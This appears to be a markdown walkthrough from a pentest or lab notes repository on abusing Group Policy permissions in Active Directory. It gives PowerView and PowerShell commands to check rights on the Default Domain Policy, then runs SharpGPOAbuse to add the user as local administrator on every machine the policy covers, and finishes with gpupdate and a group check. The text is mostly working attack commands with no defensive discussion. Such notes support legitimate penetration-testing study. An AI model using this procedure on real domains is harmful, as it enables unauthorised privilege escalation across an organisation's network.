### 1. Verify WriteDACL Permissions

Ensure you have the correct permissions on the Default Domain Policy.
#### Check Permissions
![Pasted image 20250519122035](https://github.com/user-attachments/assets/b92f76e8-9afc-45dc-b54b-6c94ff110c0f)

---

### 2. Retrieve the Default Domain Policy

Run `powerview.ps1` and retrieve the Default Domain Policy to confirm access.
#### Load PowerView

```powershell
. .\powerview.ps1
```

#### Get the Default Domain Policy

```powershell
Get-GPO -Name "Default Domain Policy"
```

If successful, this confirms that you can interact with the Default Domain Policy.
![Pasted image 20250519122143](https://github.com/user-attachments/assets/67031f0b-8bf9-47f2-b481-df034c083b7f)


What are our permissions?
``` shell
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
```
![Pasted image 20250519122224](https://github.com/user-attachments/assets/7dee67f9-a973-4d62-818a-c56f65fd6d30)


---

### 3. Add a Local Administrator Using SharpGPOAbuse

Use [SharpGPOAbuse](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/Tools/SharpGPOAbuse.exe) to add yourself as a local administrator.

#### Command to Add a Local Administrator

```cmd
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <YourUsername> --GPOName "Default Domain Policy"
```

- **`--GPOName`**: Specifies the target GPO (Default Domain Policy in this case).
- **`--UserAccount`**: Replace `<YourUsername>` with your domain username.
#### Example
![Pasted image 20250519122523](https://github.com/user-attachments/assets/45eb9e4a-bbc0-483c-be3a-5cee90f721cc)

### 4. Force GPUpdate 
``` powershell
gpupdate /force
```

### 5. Check User
``` powershell
net localgroup administrators
```

